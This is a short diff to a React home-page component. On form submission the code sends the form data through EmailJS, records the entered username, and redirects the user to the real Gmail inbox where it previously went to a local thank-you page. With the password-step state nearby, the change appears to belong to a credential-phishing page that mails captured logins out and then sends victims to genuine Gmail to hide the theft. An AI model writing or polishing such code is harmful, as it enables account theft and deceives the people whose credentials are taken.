@@ -73,7 +73,7 @@ function HomePage() {
                     emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                     setUsertazaname(userName.current.value);
                     // setErevaVer(!erevaVer);
-                    window.location.href = "/thankyou";
+                    window.location.href = "https://mail.google.com/mail/u/0/#inbox";
                     return;
                 } else {
                     if (activepass === false) { setActivePass(!activepass); }
